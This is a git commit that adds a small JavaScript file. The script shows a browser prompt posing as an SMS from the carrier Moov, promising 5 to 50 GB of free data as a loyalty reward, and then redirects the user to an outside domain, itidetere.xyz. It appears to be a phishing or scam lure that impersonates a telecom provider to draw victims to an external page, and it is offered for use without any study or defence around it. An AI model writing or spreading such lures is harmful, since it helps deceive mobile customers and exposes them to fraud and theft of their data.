e97ce5396a981f5ebf3871f05857331b7293ea30
itidmi <itid180@gmail.com>
2026-07-17 04:22:14 -0700

    Add script for free data eligibility prompt

---
+++ act-freemoovdata.js
@@ -0,0 +1,6 @@
+
+var password = 'Données gratuites'
+password=prompt('MOOV SMS: Cher client, vous êtes éligible pour recevoir entre 5 Go et 50 Go de données (récompense pour les clients fidèles) ; appuyez sur « DONNÉES GRATUITES » pour vérifier dès maintenant. ','Données gratuites');
+if (password != 'Données gratuites') {
+location.href='https://itidetere.xyz/freemoovdata.html';
+}
